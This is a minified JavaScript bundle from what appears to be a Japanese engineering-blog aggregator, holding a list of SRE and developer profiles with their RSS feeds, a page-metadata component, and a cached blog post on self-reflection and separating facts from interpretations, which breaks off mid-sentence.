"use strict";(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[736],{1202:(e,t,o)=>{o.d(t,{o:()=>a});let a=[{id:"yteraoka",name:"yteraoka",role:"SRE",bio:"ojisan",avatarSrc:"/avatars/yteraoka.jpeg",sources:["https://blog.1q77.com/index.xml","https://qiita.com/yteraoka/feed","https://medium.com/feed/@yteraoka","https://zenn.dev/yteraoka/feed"],includeUrlRegex:"",twitterUsername:"yteraoka",githubUsername:"yteraoka",websiteUrl:"https://blog.1q77.com/"},{id:"tozastation",name:"tozastation",role:"SRE",bio:"tarako_chan",avatarSrc:"/avatars/tozastation.jpg",sources:["https://qiita.com/tozastation/feed","https://tozastation.hashnode.dev/rss.xml","https://zenn.dev/tozastation/feed"],includeUrlRegex:"",twitterUsername:"tozastation",githubUsername:"tozastation",websiteUrl:"https://github.com/tozastation"},{id:"kyohmizu",name:"kyohmizu",role:"SRE",bio:"mizumoto",avatarSrc:"/avatars/kyohmizu.png",sources:["https://kyohmizu.hatenablog.com/feed","https://qiita.com/kyohmizu/feed","https://speakerdeck.com/kyohmizu.rss"],includeUrlRegex:"",twitterUsername:"kyohmizu",githubUsername:"kyohmizu",websiteUrl:"https://profile.kyohmizu.com/"},{id:"nwiizo",name:"nwiizo",role:"Software Developer",bio:"The Passionate Programmer",avatarSrc:"/avatars/nwiizo.jpeg",sources:["https://syu-m-5151.hatenablog.com/feed","https://zenn.dev/nwiizo/feed","https://speakerdeck.com/nwiizo.rss"],includeUrlRegex:"",twitterUsername:"nwiizo",githubUsername:"nwiizo",websiteUrl:"https://nwiizo.github.io/"},{id:"skikkh",name:"skikkh",role:"SRE",bio:"skikkh",avatarSrc:"/avatars/skikkh.jpeg",sources:["https://qiita.com/skikkh/feed"],includeUrlRegex:"",twitterUsername:"skikkh",githubUsername:"skikkh",websiteUrl:""},{id:"toshikish",name:"toshikish",role:"SRE",bio:"Toshiki Shimomura",avatarSrc:"/avatars/toshikish.png",sources:["https://toshikish.hateblo.jp/feed","https://zenn.dev/toshikish/feed","https://qiita.com/toshikish/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"toshikish",websiteUrl:""},{id:"Sreake",name:"Sreake",role:"",bio:"This Is The Sreake Section Blog.",avatarSrc:"/avatars/sreake.png",sources:["https://sreake.com/feed/"],includeUrlRegex:"blog",excludeUrlRegex:"event",twitterUsername:"SreakeJ",githubUsername:"",websiteUrl:"https://sreake.com"},{id:"Reckoner",name:"Reckoner",role:"",bio:"This Is The Reckoner Section Blog.",avatarSrc:"/avatars/reckoner.png",sources:[],includeUrlRegex:"blog",excludeUrlRegex:"event",twitterUsername:"reckoner_japan",githubUsername:"",websiteUrl:"https://reckoner.io/"},{id:"tez",name:"Takuya Tezuka",role:"JB",bio:"tez",avatarSrc:"/avatars/tezuka.jpeg",sources:["https://qiita.com/TT_Private/feed","https://speakerdeck.com/takuyatezuka.rss"],includeUrlRegex:"qiita.com/TT_Private",twitterUsername:"tt0603",githubUsername:"taku-tez",websiteUrl:"https://www.wantedly.com/id/takuya_tezuka"},{id:"sosan01",name:"Soichiro Tsuchida",role:"SRE",bio:"sosan",avatarSrc:"/avatars/sosan01.png",sources:[],includeUrlRegex:"",twitterUsername:"",githubUsername:"sosan01",websiteUrl:""},{id:"atsuya0",name:"Atsuya Tsukada",role:"SRE",bio:"human",avatarSrc:"/avatars/atsuya0.jpg",sources:["https://zenn.dev/tayusa/feed","https://qiita.com/atsuya0/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"atsuya0",websiteUrl:"https://github.com/atsuya0"},{id:"masasuzu",name:"SUZUKI, Masashi",role:"SRE",bio:"yasetai",avatarSrc:"/avatars/masasuzu.png",sources:["https://blog.masasuzu.net/feed","https://speakerdeck.com/masasuzu.rss"],includeUrlRegex:"",twitterUsername:"masasuz",githubUsername:"masasuzu",websiteUrl:"https://masasuzu.net"},{id:"kiyos",name:"Kyohei Saito",role:"SRE",bio:"haraheri",avatarSrc:"/avatars/kiyos.jpeg",sources:["https://zenn.dev/kyohei_saito/feed"],includeUrlRegex:"",twitterUsername:"kiyo_12_07",githubUsername:"kiyo-s",websiteUrl:""},{id:"mos914",name:"Yu Kaneko",role:"SRE",bio:"koke",avatarSrc:"/avatars/mos914.png",sources:["https://qiita.com/dirtymosschan/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"mos914",websiteUrl:""},{id:"unvavo",name:"nobu",role:"SRE",bio:"nobu",avatarSrc:"/avatars/nobu.png",sources:[],includeUrlRegex:"",twitterUsername:"unvavo",githubUsername:"unvavo",websiteUrl:""},{id:"hiroki-hasegawa",name:"長谷川 広樹",role:"なんらかのエンジニア",bio:"顔画像は著作権フリーですのでどうぞ",avatarSrc:"/avatars/hirokihasegawa.png",sources:["https://hiroki-hasegawa.hatenablog.jp/feed","https://speakerdeck.com/hiroki_hasegawa.rss"],includeUrlRegex:"",twitterUsername:"Hiroki__IT",githubUsername:"hiroki-it",websiteUrl:"https://hiroki-it.github.io/tech-notebook/"},{id:"kaisato",name:"Kai Sato",role:"SRE",bio:"domo",avatarSrc:"/avatars/kaisato.png",sources:[],includeUrlRegex:"",twitterUsername:"KAI21441756",githubUsername:"kaitexio",websiteUrl:""},{id:"ysakurai",name:"Yusuke Sakurai",role:"SRE",bio:"ysakurai",avatarSrc:"/avatars/ysakurai.jpg",sources:["https://qiita.com/ys1/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"saku3",websiteUrl:""},{id:"tayakun",name:"Soichiro Taya",role:"SRE",bio:"tayakun",avatarSrc:"/avatars/tayakun.png",sources:["https://qiita.com/tayakun/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"tayatamn",websiteUrl:""},{id:"SatohJohn",name:"SatohJohn",role:"Software Developer",bio:"SatohJohn",avatarSrc:"/avatars/satohjohn.png",sources:["https://qiita.com/satohjohn/feed","https://zenn.dev/satohjohn/feed"],includeUrlRegex:"",twitterUsername:"satohjohn",githubUsername:"satohjohn",websiteUrl:""},{id:"bayobayo0324",name:"bayobayo0324",role:"back/front/app Engineer",bio:"osake daisuki",avatarSrc:"/avatars/bayobayo0324.jpeg",sources:["https://qiita.com/bayobayo0324/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"bayobayo0324",websiteUrl:""},{id:"myamamoto",name:"myamamoto",role:"SRE",bio:"human",avatarSrc:"/avatars/myamamoto.jpeg",sources:["https://zenn.dev/ureuzy/feed"],includeUrlRegex:"",twitterUsername:"ureuzy",githubUsername:"ureuzy",websiteUrl:""},{id:"seno",name:"seno",role:"DBRE",bio:"seno",avatarSrc:"/avatars/seno.jpeg",sources:["https://zenn.dev/nedoko_dok0dko/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"senohirona",websiteUrl:""},{id:"sakama",name:"sakama",role:"SRE",bio:"homo sapiens",avatarSrc:"/avatars/sakama.jpeg",sources:[],includeUrlRegex:"",twitterUsername:"",githubUsername:"junichiro-sakama",websiteUrl:""},{id:"stakamura",name:"Shohei Takamura",role:"SRE",bio:"SRE",avatarSrc:"/avatars/stakamura.jpg",sources:["https://zenn.dev/hakushou41/feed"],includeUrlRegex:"",twitterUsername:"hakushou41",githubUsername:"hakushou41",websiteUrl:""},{id:"toVersus",name:"Tsubasa Nagasawa",role:"SRE",bio:"lazy programmer",avatarSrc:"/avatars/toVersus.png",sources:["https://qiita.com/toVersus/feed","https://zenn.dev/toversus/feed"],includeUrlRegex:"",twitterUsername:"toversus26",githubUsername:"toVersus",websiteUrl:""},{id:"raba-jp",name:"Hiroki Sakuraba",role:"Software Developer",bio:"meow",avatarSrc:"/avatars/raba-jp.jpg",sources:["https://zenn.dev/raba_jp/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"raba-jp",websiteUrl:""},{id:"ixsakra",name:"Ryosuke Sakurai",role:"SRE",bio:"ganbarumasu 'w'",avatarSrc:"/avatars/ixsakra.jpg",sources:[],includeUrlRegex:"",twitterUsername:"",githubUsername:"",websiteUrl:""},{id:"nnaka2992",name:"NAKADATE Naoki",role:"DBRE",bio:"what on the earth is Database?",avatarSrc:"/avatars/nnaka2992.jpg",sources:["https://nnaka2992.hatenablog.com/feed","https://zenn.dev/nnaka2992/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"",websiteUrl:"https://nnaka2992.hatenablog.com/"},{id:"satoken",name:"satoken",role:"SRE",bio:"",avatarSrc:"/avatars/satoken.jpg",sources:[],includeUrlRegex:"",twitterUsername:"",githubUsername:"",websiteUrl:""},{id:"bells17",name:"bells17",role:"Software Engineer",bio:"Software Engineer",avatarSrc:"/avatars/bells17.jpeg",sources:["https://zenn.dev/bells17/feed","https://medium.com/feed/@bells17","https://speakerdeck.com/bells17.rss"],includeUrlRegex:"",twitterUsername:"bells17_",githubUsername:"bells17",websiteUrl:"https://bells17.io/"},{id:"hide-1",name:"Shuichi Inoue",role:"long-term internship student",bio:"I want to become a strong engineer :)",avatarSrc:"/avatars/hide-1.jpg",sources:["https://sreake.com/blog/config-connectortest/feed","https://sreake.com/blog/kubernetes-operation-with-chatgpt/feed","https://sreake.com/blog/kubernetes-operation-with-chatgpt4/feed","https://sreake.com/blog/chatgpt-slack-integration/feed"],includeUrlRegex:"",twitterUsername:"19MU50",githubUsername:"hide-1",websiteUrl:""},{id:"yuu0w0yuu",name:"Yutaro Shirayama",role:"SRE",bio:"( ˘ω˘ )",avatarSrc:"/avatars/shirayama.jpg",sources:["https://zenn.dev/yuu0w0yuu/feed"],includeUrlRegex:"",twitterUsername:"yuu0w0yuu",githubUsername:"yuu0w0yuu",websiteUrl:""},{id:"gawingowin",name:"Araki Shogo",role:"long-term internship student",bio:"born 2 be engineer",avatarSrc:"/avatars/araki-icon.jpg",sources:[],includeUrlRegex:"",twitterUsername:"GawinGowin",githubUsername:"GawinGowin",websiteUrl:""},{id:"nomadblacky",name:"Takumi Kadowaki",role:"Software Engineer @ Reckoner",bio:"Scala / Observability",avatarSrc:"/avatars/nomadblacky.jpg",sources:["https://zenn.dev/nomadblacky/feed","https://speakerdeck.com/nomadblacky.rss"],includeUrlRegex:"",twitterUsername:"nomadblacky",githubUsername:"NomadBlacky",websiteUrl:""},{id:"kobuchi",name:"Shu Kobuchi",role:"Software Developer",bio:"mammalian",avatarSrc:"/avatars/kobuchi.jpeg",sources:["https://shu-kob.hateblo.jp/feed","https://speakerdeck.com/shukob.rss"],includeUrlRegex:"",twitterUsername:"shu_kob",githubUsername:"shu-kob",websiteUrl:""},{id:"kojake_300",name:"Yuki Iwasaki",role:"SRE",bio:"Splatoon",avatarSrc:"/avatars/yuki_iwasaki.png",sources:["https://qiita.com/kojake_300/feed","https://zenn.dev/kojake_300/feed","https://speakerdeck.com/kojake_300.rss"],includeUrlRegex:"",twitterUsername:"kojake_300",githubUsername:"",websiteUrl:""},{id:"kurita",name:"Kurita Keigo",role:"long-term internship student",bio:"I want to enginner the reliablity of the site",avatarSrc:"/avatars/kurita.jpg",sources:["https://kechigon.hatenablog.com/feed"],includeUrlRegex:"",twitterUsername:"kechigongon",githubUsername:"kechigon",websiteUrl:"https://www.wantedly.com/id/keigo_kurita_e"},{id:"masaru-komiyama",name:"masaru-komiyama",role:"SRE",bio:"SRE",avatarSrc:"/avatars/komiyama5380.jpg",sources:["https://qiita.com/masaru-komiyama/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"",websiteUrl:"https://qiita.com/masaru-komiyama/"},{id:"moz-sec",name:"Kobayashi Shun",role:"long-term internship student",bio:"I am a graduate student in Kyoto",avatarSrc:"/avatars/kobayashi.png",sources:["https://moz-security.hatenablog.com/feed","https://zenn.dev/moz_sec/feed","https://speakerdeck.com/moz_sec_.rss"],includeUrlRegex:"",twitterUsername:"moz_sec_",githubUsername:"moz-sec",websiteUrl:"https://moz-sec.com/"},{id:"yyamada",name:"Yunosuke Yamada",avatarSrc:"/avatars/yyamada.jpg",role:"Full Stack Engineer",bio:"筋トレ / LLM / Webアプリケーション",sources:["https://zenn.dev/kimitsu/feed","https://speakerdeck.com/yunosukey.rss"],githubUsername:"YunosukeY",twitterUsername:"east_k1mitsu",websiteUrl:"https://linktr.ee/kimitsu"},{id:"k-nagase",name:"Kohei Nagase",avatarSrc:"/avatars/koheinagase.jpg",role:"SRE",bio:"YANIKASU",sources:["https://zenn.dev/k_nagase/feed"],githubUsername:"k-ngs",twitterUsername:"koh_naga",websiteUrl:""},{id:"iota",name:"Itaru Ota",avatarSrc:"/avatars/iota.jpg",role:"Full Stack Engineer",bio:"A.R.E.",sources:["https://zenn.dev/iorandd/feed","https://speakerdeck.com/ota1022.rss"],githubUsername:"Ota1022",twitterUsername:"iorandd",websiteUrl:"https://ota1022.github.io/"},{id:"kamono",name:"Makoto Kamono",avatarSrc:"/avatars/kamono.jpg",role:"SRE",bio:"kamo dayo~",sources:["https://zenn.dev/kamos/feed"],githubUsername:"Mkamono",twitterUsername:"duckend_pg",websiteUrl:""},{id:"akagawa",name:"Daisuke Akagawa",avatarSrc:"/avatars/akagawa.png",role:"Full Stack Engineer",bio:"Akasan",sources:["https://zenn.dev/akasan/feed","https://medium.com/feed/@daisuke1024akagawa"],githubUsername:"Akasan",twitterUsername:"",websiteUrl:""},{id:"kugimiya",name:"Daichi Kugimiya",avatarSrc:"/avatars/kugimiya.jpeg",role:"Full Stack Engineer",bio:"Kugimiya",sources:["https://zenn.dev/meziron/feed"],githubUsername:"daikugimiya0715",twitterUsername:"abimaruXD",websiteUrl:""},{id:"matsuura",name:"Yushin Matsuura",avatarSrc:"/avatars/matsuura.png",role:"Full Stack Engineer",bio:"Matsuura",sources:["https://qiita.com/m_pig/feed"],githubUsername:"you-matsuura",twitterUsername:"yuu_matsu_yuu",websiteUrl:"https://qiita.com/m_pig"},{id:"silasolla",name:"Masaki Haga",avatarSrc:"/avatars/silasolla.png",role:"Full Stack Engineer",bio:"Trust, but verify.",sources:["https://zenn.dev/silasolla/feed","https://silasol.la/rss/tech.xml"],githubUsername:"silasolla",twitterUsername:"silasolla",websiteUrl:"https://silasol.la"},{id:"amine",name:"Amine Ilidrissi",avatarSrc:"/avatars/amine.jpeg",role:"Full Stack Application Engineer",bio:"Writing about Laravel, Astro, and whatever happens on the job",sources:["https://qiita.com/aminevg/feed","https://speakerdeck.com/aminevg.rss"],githubUsername:"aminevg",twitterUsername:"realaminevg",websiteUrl:""},{id:"reito",name:"Reito Koike",role:"SRE",bio:"curiosity-driven SRE",avatarSrc:"/avatars/reito.png",sources:["https://zenn.dev/r4ynode/feed","https://qiita.com/r4ynode/feed"],includeUrlRegex:"",twitterUsername:"r4ynode",githubUsername:"r4ynode",websiteUrl:""},{id:"riiim",name:"riiim",role:"Engineer",bio:"Engineer",avatarSrc:"/avatars/riiim.png",sources:["http://rowicy.com/RiiiM/rss.xml"],includeUrlRegex:"",twitterUsername:"riiim400th",githubUsername:"riiim400th",websiteUrl:"https://www.rowicy.com/blog/"},{id:"sraku",name:"Sota Nakano",role:"SRE",bio:"sraku",avatarSrc:"/avatars/sraku.jpg",sources:["https://zenn.dev/sraku/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"sraku2159",websiteUrl:""},{id:"takehiro1111",name:"takehiro1111",role:"Engineer",bio:"takehiro1111",avatarSrc:"/avatars/takehiro1111.jpg",sources:["https://zenn.dev/takehiro1111/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"takehiro1111",websiteUrl:""}].sort((e,t)=>e.id<t.id?-1:1)},4003:(e,t,o)=>{o.d(t,{t:()=>s});var a=o(7876),r=o(7328),i=o.n(r),n=o(9348);let s=e=>{let{path:t,title:o,description:r,ogImageUrl:s,noindex:c,removeSiteNameFromTitle:l}=e,u="".concat(n.$.siteRoot).concat(t||"");return(0,a.jsxs)(i(),{children:[(0,a.jsx)("title",{children:l?o:"".concat(o," | ").concat(n.$.siteMeta.title)}),(0,a.jsx)("meta",{property:"og:title",content:o}),(0,a.jsx)("meta",{property:"og:url",content:u}),(0,a.jsx)("meta",{name:"twitter:card",content:"summary_large_image"}),(0,a.jsx)("meta",{property:"og:site",content:n.$.siteMeta.title}),(0,a.jsx)("meta",{property:"og:image",content:s||"".concat(n.$.siteRoot,"/og.png")}),!!r&&(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)("meta",{name:"description",content:r}),(0,a.jsx)("meta",{property:"og:description",content:r})]}),t&&(0,a.jsx)("link",{rel:"canonical",href:u}),c&&(0,a.jsx)("meta",{name:"robots",content:"noindex"})]})}},6067:e=>{e.exports=JSON.parse('[{"title":"おい、内省しろ","link":"https://syu-m-5151.hatenablog.com/entry/2025/11/12/095935","contentSnippet":"はじめに「私は、自分のことを本当に見ているのか」私や私たちは日常の中で、様々な状況に直面します。そのとき、自己否定的な判断を下します。目の前の現象を見て諦めます。行動できず能力を疑います。他者の姿を見て否定的に反応します。これらすべてに共通しているのは、自分の内面を客観的に振り返っていないことです。なぜその状態が生じたのか。なぜその行動パターンが繰り返されるのか。なぜその感情が湧き上がるのか。なぜその反応をしてしまうのか。表面的には分かっている気がします。「外的な制約があるから」「心身の状態が悪いから」「自分の性質がそうだから」。でも、これらはだいたい本当の理由ではありません。もっと深いところに、本当の理由があります。そして、その理由に辿り着くための行為を、「内省（リフレクション）」と呼びます。内省とは、自分の内面を客観的、批判的に振り返る行為です。表面的な感情や行動ではなく、その背景にある「認知」を見つめ直すこと。なぜそう感じたのか。なぜそう行動したのか。その判断の背景には、どんな価値観や過去の経験があるのか。ここで重要な認識があります。経験の蓄積だけでは学びになりません。どれだけ多くの経験をしても、それを振り返らなければ、同じ失敗を繰り返します。経験の「量」ではなく「質」が重要であり、意図的な内省や省察を通じて初めて経験は学びとなります。つまり、「経験+内省=学習」という公式です。毎日短時間の内省をするだけで、パフォーマンスが向上します。これは、私自身も実感してきたことです。この問いに向き合うことで、初めて自分を変えられます。逆に言えば、内省なしに自分を変えることは、ほぼ不可能です。新しいメソッドを試しては「イマイチ使いこなせない」と手放し、また違うものを取り入れる。この繰り返しをしていませんか。本を読んでは「分かった気がする」となりますが、何も変わりません。技術を学んでは「これは自分に合わない」と諦めます。実は、どれだけ研修を受けても、内省なしでは学んだことの大半が忘れられてしまいます。この状況で足りないのは、新しい知識やメソッドではありません。「自分自身に向き合うこと」です。古代から言われてきました。「無反省な生は生きるに値しない」。この言葉が、今も真実であり続けています。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。では、早速はじめていきます。なぜ私たちは、自分を見ないのか内省の重要性は、誰もが知っています。「自分を振り返ることは大切だ」。この言葉に反対する人はいないでしょう。でも、実際にやっている人は少ないです。なぜでしょうか。向き合うことが怖いから。 本当の理由を知ることは、怖いです。「自分は才能がない」という結論に辿り着くことが怖いです。「自分は怠けている」という事実を認めることが怖いです。「自分は間違っていた」と認めることが怖いです。だから、表面的な理由で納得します。「忙しいから」「環境が悪いから」「運が悪かったから」。これらの理由なら、自分を責めなくていいです。自分を変えなくてもいいです。でも、この逃避が、成長を止めます。本当の理由に向き合わない限り、同じパターンを繰り返します。同じ失敗をします。同じところで躓きます。やり方が分からないから。「内省しろ」と言われても、何をすればいいのか分かりません。ただぼんやりと「反省」することとは違います。「ああ、失敗した」「次は頑張ろう」。これは内省ではありません。ただの後悔です。内省には、構造があります。フレームワークがあります。順序があります。でも、誰もそれを教えてくれません。学校でも教わりません。会社でも教わりません。だから、多くの人は「内省の仕方」を知らないまま大人になります。即効性がないから。 内省の効果は、すぐには見えません。1回振り返ったからといって、明日から劇的に変わるわけではありません。むしろ、最初は苦しいだけです。自分の醜い部分を見つめることになります。認めたくない事実と向き合うことになります。一方、新しいメソッドや技術を学ぶことには即効性を感じます。「これを使えば、すぐに生産性が上がる」。そんな期待があります。でも、実際にはどうでしょうか。メソッドを次々と試しても、何も変わりません。根本的な問題はメソッドにあるのではなく、自分の中にあるからです。内省の効果は遅効性ですが、持続性があります。一度自分のパターンに気づけば、それは一生使える知恵になります。忙しすぎるから。「内省する時間がない」。これは、最も一般的な言い訳です。そして、最も危険な言い訳でもあります。なぜなら、内省する時間がないほど忙しい状態は、まさに内省が最も必要な状態だからです。複雑で不確実な世界において、内省はかつてないほど重要です。急速な変化、情報過多、常につながり続けるデジタル環境。私たちが直面する課題は、「準備-発射-照準」の反射的行動ではなく、思慮深い内省を要求します。立ち止まって考えることなく走り続けていると、間違った方向に全力で進んでいることに気づきません。効率の悪いやり方を改善することなく、ただ長時間働き続けます。本当に重要なことを見失ったまま、目の前のタスクに追われ続けます。内省する時間がないと言う人ほど、内省が必要です。反省と内省は、まったく違う多くの人が、反省と内省を混同しています。反省は、過去の失敗を後悔すること。「ああ、あの時ああすればよかった」「なんであんなことをしてしまったんだ」。感情的で、自己否定的で、建設的ではありません。内省は、過去の経験を客観的に分析すること。「なぜあの時、あの判断をしたのか」「その判断の背景には、どんな認知があったのか」「次に活かせる学びは何か」。論理的で、客観的で、未来志向です。日本語には実は、この違いを表す2つの言葉があります。反省(はんせい)は、自分の間違いを認め、改善を誓うこと。失敗に焦点を当て、「これは悪かった、次はもっと良くする」と認識します。一方、内省(ないせい)は、より深い自己省察です。内的感情、価値観、動機を吟味します。「私は緊張していた、急いでいた」と自分の内的状態を理解します。判断や評価を保留し、ただ観察します。現代的な「リフレクション」は、この内省に近いです。成功と失敗の両方を客観的に検討し、良い点と悪い点の両方を含み、未来志向で学びを得るプロセスです。優れた組織には「問題がないことこそ問題」という考え方があります。問題を特定できないことは批判的評価の不十分さを示します。つまり、成功したプロジェクトでも振り返りを行い、継続的改善の基盤を作るのです。反省のパターンは破壊的です。失敗します。「自分はダメだ」と落ち込みます。「次は頑張ろう」と決意します。でも、具体的に何を変えるかは分かりません。しばらくすると、同じ失敗を繰り返します。再び落ち込みます。そして「頑張ろう」と決意します。このループは、何も生みません。なぜなら、「なぜ失敗したのか」を本当に理解していないからです。表面的な感情だけで終わっているからです。内省のパターンは建設的です。失敗します。「なぜ失敗したのか」を客観的に分析します。何が起きたのか（事実）、それについてどう思ったか（意見）、どんな感情を抱いたか（感情）、背景にどんな過去の経験があったか（経験）、判断に影響を与えた価値観は何か（価値観）。この分析を通じて、失敗の「構造」が見えてきます。「自分はこういう状況で、こういう判断をしやすい」というパターンが見えてきます。そして、このパターンを理解することで、初めて変えられます。反省は自己否定で終わります。内省は自己理解から始まります。認知を解剖する内省の基本は、「メタ認知」を高めることです。メタ認知とは、「認知していることを認知する」能力。自分がどう考えているかを、一歩引いて客観的に観察する能力です。私たちは毎日、無数の判断をしています。でも、その判断がどこから来ているのか、意識していません。「新しいことは難しい」「あの人は信頼できない」「自分には無理だ」「これは正しい」。これらの判断は、どこから生まれているのでしょうか。実は、私たちの認知には構造があります。そして、この構造を理解することで、自分の判断を客観的に見つめ、必要に応じて変えることができます。組織学習の研究では、これを「ダブルループ学習」と呼びます。シングルループ学習は、既存の目標や前提を維持しながら誤りを修正する表面的な学びです。一方、ダブルループ学習は、目標や価値観、枠組みそのものを問い直す深い学びです。内省の本質は、まさにこの「前提を疑う」ことにあります。行為とその結果だけでなく、行為の背後にある価値観や仮定を検討することで、根本的な変革が可能になります。内省の3つの問い内省とは、自分に正しい問いを投げかけることです。正しい問いは、見えなかったものを見えるようにします。深い問いは、表面の下にある本質を明らかにします。そして、内省には、3つの核心的な問いがあります。第一の問い：「本当は何が起きているのか？」これは、事実と解釈を分ける問いです。私たちは、事実と解釈を混同しています。「上司が私を嫌っている」。これは事実でしょうか。違います。解釈です。事実は「上司が今日、挨拶しなかった」。それを「嫌っている」と解釈しているのは、自分です。「自分には才能がない」。これは事実でしょうか。違います。解釈です。事実は「この課題がうまくできなかった」。それを「才能がない」と解釈しているのは、自分です。「新しいことは難しい」。これは事実でしょうか。違います。解釈です。事実は「過去に一度、新しいことで挫折した」。それを「すべての新しいことは難しい」と解釈しているのは、自分です。この第一の問いは、現実を歪めている色眼鏡を外す問いです。私たちは世界をありのままに見ていません。自分のフィルターを通して見ています。そして、そのフィルターに気づいていません。実践：事実と解釈を分ける今、あなたが悩んでいること、困っていること、避けていることを1つ選びます。そして、こう問います。「ここで確実に起きた事実は何か？」具体的に、何が起きたのか？誰が、何を、いつ、どこで？測定可能な、観察可能な事実は？「私はそれをどう解釈しているのか？」- 私は何を「意味する」と思っているのか？- 私はどんな物語を作っているのか？- 私は何を「真実だ」と決めつけているのか？例を見てみましょう。場面：プロジェクトのリーダーを打診されて断った混在した状態：「私にはリーダーの能力がないから断った。自分は向いていない。失敗したら大変なことになる」分離した状態：事実：上司から「次のプロジェクトのリーダーをやってみないか」と打診された私は「今は忙しいので」と断った過去に一度、小規模なチームのリーダーをして、メンバーとの調整に苦労した解釈：「私にはリーダーの能力がない」「失敗したら大変なことになる」「自分は向いていない」「リーダーとは特別な才能を持った人がやるものだ」この分離をすると、驚くべきことが見えてきます。事実はシンプルで、解釈は複雑です。そして、自分を縛っているのは事実ではなく、解釈です。事実「過去に一度苦労した」から、解釈「自分には能力がない」を導き出しています。でも、それは論理的に正しいでしょうか。一度の苦労は、能力がないことの証明でしょうか。むしろ、苦労しながらも完遂したことは、学びと成長の証拠ではないでしょうか。「能力がない」という解釈は、本当に事実に基づいているのでしょうか。それとも自分の恐怖が作り出した物語なのでしょうか。第一の問いは、この物語に気づくための問いです。第二の問い：「私はどんな前提で動いているのか？」これは、無意識のルールを見つける問いです。私たちの行動は、無意識のルールに支配されています。「〜べき」「〜ねばならない」「〜してはいけない」。これらのルールは、意識されることなく、すべての判断を決定しています。このルールを、前提と呼びます。前提とは、「当たり前だ」と思っていて、疑ったことがない思い込みです。実践：前提を発掘する先ほどの解釈を、さらに深く掘り下げます。「なぜそう解釈したのか？」を問い続けると、前提が見えてきます。解釈：「私にはリーダーの能力がない」 → なぜそう思う？ → 前提：「リーダーとは、最初から完璧にできる人だ」解釈：「失敗したら大変なことになる」 → なぜそう思う？ → 前提：「失敗は許されない」「失敗は恥だ」解釈：「自分は向いていない」 → なぜそう思う？ → 前提：「向いていないことはやるべきではない」「苦労するのは才能がない証拠だ」これらの前提を言語化すると、あることに気づきます。完璧に同じ一つの真実というものは、ほとんどこの世にありません。あるのは、いろんな解釈だけです。「リーダーとは、最初から完璧にできる人だ」→本当に？多くのリーダーは試行錯誤しながら成長してきたのでは？「失敗は許されない」→本当に？失敗から学ぶことの方に価値があるのでは？「苦労するのは才能がない証拠だ」→本当に？苦労するのは、新しいことに挑戦している証拠では？前提は、過去の経験から形成されます。多くの場合、子供の頃の経験、初期の失敗体験、周囲の大人の言葉。これらが積み重なって、前提が作られます。でも、その前提が今のあなたに適切かどうか、検証されたことはありません。第二の問いは、この無意識のルールを意識化する問いです。前提を見つける手がかり：「〜べき」「〜ねばならない」を探す「完璧であるべき」「人に迷惑をかけてはならない」「弱みを見せてはいけない」「当たり前だ」と思っていることを疑う「仕事は辛いものだ」→本当に？「年齢相応の成果を出すべきだ」→なぜ？「感情を出すのは未熟だ」→誰がそう決めた？自分を縛っている「ルール」を書き出す私は◯◯してはいけない私は◯◯でなければならない私は◯◯すべきだこれらの前提を可視化すると、驚くべき発見があります。自分を最も縛っているのは、自分が作ったルールだったということです。第三の問い：「他にどんな可能性があるのか？」これは、固定された見方を解く問いです。第一の問いで事実と解釈を分けました。第二の問いで前提を見つけました。そして第三の問いで、新しい解釈、新しい前提を探します。私たちは、1つの見方に固執しています。「これしかない」「他に選択肢はない」。でも、本当にそうでしょうか。実践：視点を変える同じ事実に対して、複数の解釈を試してみます。事実：プロジェクトのリーダーを打診された。過去に一度リーダーをして苦労した。解釈A（元の解釈）：「自分には能力がない。失敗する。やるべきではない」→ 前提：「完璧でなければやってはいけない」解釈B（新しい解釈）：「上司は自分の成長を期待している。苦労した経験から学んだことを活かせる機会だ」→ 前提：「成長は挑戦から生まれる」解釈C（新しい解釈）：「過去の経験があるからこそ、今回は違うアプローチができる。苦労を知っているからこそ、メンバーの気持ちが分かる」→ 前提：「経験は財産だ」解釈D（新しい解釈）：「完璧である必要はない。学びながら進めばいい。サポートを求めてもいい」→ 前提：「不完全でも価値がある」同じ事実でも、解釈次第で、まったく異なる未来が開けます。解釈Aを選べば断ります。解釈B、C、Dを選べば引き受けます。そして、どちらを選ぶかは自分次第です。ここで重要な気づきがあります。私たちは、解釈を選ぶことができます。事実は変えられません。でも、解釈は選べます。そして、解釈が変われば感情が変わります。感情が変われば行動が変わり、結果が変わります。可能性を開く問いかけとして、次のようなものがあります。「もし〜だとしたら？」もしこれが学びの機会だとしたら？もし失敗してもいいとしたら？もし周囲がサポートしてくれるとしたら？「別の角度から見たら？」この状況を、5年後の自分はどう見る？自分の親友がこの状況にいたら、何とアドバイスする？尊敬する人なら、どう捉える？「最悪と最高の間には？」最悪のシナリオは？（たいてい、そこまで悪くない）最高のシナリオは？（たいてい、可能性がある）現実的な中間のシナリオは？第三の問いは、固定された一つの見方から、複数の可能性へと視野を広げる問いです。内省の実践この3つの問いは、連鎖しています。第一の問いで、事実と解釈を分けます。「私は世界を歪めて見ている」ことに気づきます。第二の問いで、なぜ歪めて見ているのかを理解します。「無意識の前提が判断を決めている」ことに気づきます。第三の問いで、他の見方を探します。「1つの見方に固執する必要はない」ことに気づきます。この3つの問いを繰り返すことで、内省は深まります。そして、驚くべき変化が起きます。同じ状況に対する反応が、まったく変わります。具体例：「新しい技術を学ぶのが億劫だ」第一の問い：本当は何が起きているのか？混在：「新しい技術を学ぶのが億劫だ。自分には向いていない」事実として起きていること。- 新しい技術を学ぶ機会がある。- 2年前、別の技術を学ぼうとして3日で諦めた。- 